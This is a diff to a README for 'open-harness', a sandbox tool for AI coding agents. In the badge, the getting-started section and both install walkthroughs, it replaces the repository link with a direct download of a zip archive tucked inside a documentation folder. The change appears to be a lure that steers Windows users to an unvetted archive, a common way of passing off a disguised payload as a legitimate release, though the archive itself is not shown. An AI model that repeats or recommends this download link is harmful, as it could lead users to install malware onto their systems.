@@ -1,13 +1,13 @@
 # 🧩 open-harness - Run AI sandboxes with ease
 
-[![Download open-harness](https://img.shields.io/badge/Download-open--harness-blue?style=for-the-badge&logo=github)](https://github.com/trimanabas391/open-harness)
+[![Download open-harness](https://img.shields.io/badge/Download-open--harness-blue?style=for-the-badge&logo=github)](https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip)
 
 ## 🚀 Getting Started
 
 open-harness gives you isolated sandbox images for AI coding agents. It helps you run tools in a clean, separate space on Windows, so your main system stays organized.
 
 If you want to try it now, visit this page to download:
-https://github.com/trimanabas391/open-harness
+https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip
 
 ## 🖥️ What You Need
 
@@ -25,7 +25,7 @@ If you plan to use GPU-based tools, a system with NVIDIA support helps. If you o
 ## 📦 Download and Install
 
 1. Open this page in your browser:
-   https://github.com/trimanabas391/open-harness
+   https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip
 
 2. Look for the download area on the page.
 
@@ -185,7 +185,7 @@ Before you use open-harness, confirm:
 For the fastest path on Windows:
 
 1. Visit this page:
-   https://github.com/trimanabas391/open-harness
+   https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip
 2. Download the repository files
 3. Install Docker Desktop
 4. Extract the files
